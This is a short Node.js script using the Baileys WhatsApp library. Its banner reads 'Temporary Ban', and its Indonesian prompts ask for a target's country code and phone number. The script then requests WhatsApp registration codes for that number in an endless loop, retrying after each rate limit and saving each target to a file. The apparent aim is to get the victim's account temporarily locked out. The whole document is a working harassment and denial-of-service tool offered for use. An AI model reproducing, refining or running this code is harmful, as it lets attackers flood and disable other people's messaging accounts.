const prompt = require('prompt-sync')();
const gradient = require('gradient-string');
const pino = require('pino');
const fs = require('fs')
const figlet = require("figlet")

const { default: makeWaSocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');

const numbers = JSON.parse(fs.readFileSync('n.json'));

const start = async () => {

  const { state, saveCreds } = await useMultiFileAuthState('.rey')

  const spam = makeWaSocket({
    auth: state,
    mobile: true,
    logger: pino({ level: 'silent' })
  })
  //console.clear();
  const dropNumber = async (context) => {
    const { phoneNumber, ddi, number } = context;
    while (true) {
      try {
      console.clear();
      console.log(gradient('red', 'red')(': +' + ddi + number))
        res = await spam.requestRegistrationCode({
          phoneNumber: '+' + phoneNumber,
          phoneNumberCountryCode: ddi,
          phoneNumberNationalNumber: number,
          phoneNumberMobileCountryCode: 62
        })
        b = (res.reason === 'temporarily_unavailable');
        if (b) {
          setTimeout(async () => {
            dropNumber(context)
          }, res.retry_after * 1000)
          return;
        }
      } catch (error) {
        //console.log(error)
      }
    }

  }
  console.clear();
  figlet.text("Temporary  Ban", function (err, data){
 console.log(gradient('red', 'blue')(data) )
});
  console.log(gradient('red', 'blue')(''))
  console.log(gradient('red', 'blue')(''))
  console.log(gradient('red', 'blue')(''))
  let ddi = prompt(gradient('blue', 'red')('[+] Samns | Kode Negara ?: '));
  let number = prompt(gradient('blue', 'red')('[+] Samns | Nomor Target ?: '))
  let phoneNumber = ddi + number;
  numbers[phoneNumber] = { ddi, number }
  fs.writeFileSync('n.json', JSON.stringify(numbers, null, '\t'));
  dropNumber({ phoneNumber, ddi, number })
console.clear();
}
start();
